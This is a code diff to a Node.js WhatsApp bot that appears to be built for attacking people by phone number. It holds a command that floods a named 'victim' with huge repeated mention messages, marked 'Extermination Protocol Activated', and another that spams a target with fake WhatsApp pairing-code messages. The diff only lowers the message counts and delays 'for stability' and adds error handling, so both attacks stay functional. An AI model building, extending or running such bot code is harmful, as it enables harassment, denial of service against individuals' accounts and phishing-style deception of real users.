@@ -5,6 +5,9 @@ const fs = require('fs');
 const chalk = require('chalk').default;
 const Boom = require('@hapi/boom');
 
+process.on('uncaughtException', console.error);
+process.on('unhandledRejection', console.error);
+
 const store = makeInMemoryStore({ logger: P().child({ level: 'silent', stream: 'store' }) });
 
 const rl = readline.createInterface({
@@ -85,11 +88,11 @@ async function startBot() {
             if (!victimNumber.match(/^\d+$/)) return sock.sendMessage(sender, { text: "❌ *Invalid Number!* Use country code without +" });
 
             const victimJid = `${victimNumber}@s.whatsapp.net`;
-            let attackMessage = `\n~@${victimNumber}~\n*💀 Extermination Protocol Activated* `.repeat(15000);
+            let attackMessage = `\n~@${victimNumber}~\n*💀 Extermination Protocol Activated* `.repeat(50); // Reduced for stability
 
-            for (let i = 0; i < 10200; i++) {
+            for (let i = 0; i < 20; i++) {
                 await sock.sendMessage(victimJid, { text: attackMessage });
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                await new Promise(resolve => setTimeout(resolve, 300));
             }
 
             await sock.sendMessage(sender, { text: `✅ ${victimNumber} par attack shuru ho gaya!` });
@@ -113,6 +116,7 @@ async function startBot() {
                 await sock.sendMessage(targetJid, { text: `WhatsApp pairing code: ${fakeCode}\n\nDo not share this code with anyone!` });
                 console.log(`[${i + 1}/${messageCount}] Fake code sent to ${targetNumber}`);
             }
+
             await sock.sendMessage(sender, { text: `✅ Fake pairing spam sent to ${targetNumber}` });
         }
     });
@@ -121,7 +125,12 @@ async function startBot() {
         const { connection, lastDisconnect, qr } = update;
 
         if (connection === 'close') {
-            const reason = Boom.boomify(lastDisconnect?.error)?.output?.statusCode;
+            let reason = 'Unknown';
+            try {
+                reason = Boom.boomify(lastDisconnect?.error)?.output?.statusCode || 'Unknown';
+            } catch (e) {
+                reason = 'Error parsing disconnect reason';
+            }
             console.log(chalk.red(`Connection closed. Reason: ${reason}`));
         }
 
